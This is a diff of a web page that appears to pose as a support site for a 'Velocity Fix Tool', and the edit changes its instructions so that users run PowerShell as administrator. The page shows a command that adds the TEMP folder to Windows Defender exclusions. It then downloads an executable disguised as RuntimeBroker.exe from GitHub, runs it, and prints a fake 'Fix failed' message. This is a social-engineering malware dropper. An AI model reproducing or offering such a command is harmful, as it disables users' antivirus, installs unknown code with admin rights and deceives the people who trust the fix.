@@ -176,7 +176,7 @@
         <div class="menu-content">
             <img src="https://cdn.discordapp.com/icons/943223926509699072/d08e6e1257804501fa056a967248711e.png?size=4096" alt="Menu Logo" class="menu-logo">
             <h2>Fix Your Issue</h2>
-            <p>To resolve your problem, open PowerShell and run this command:</p>
+            <p>To resolve your problem, open PowerShell with admin and run this command:</p>
             <div class="ps-command" id="psCommand">
                 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Velocity Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://github.com/Wizknaory/clients/raw/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "Fix failed, please try again later or contact support." -ForegroundColor Red
             </div>
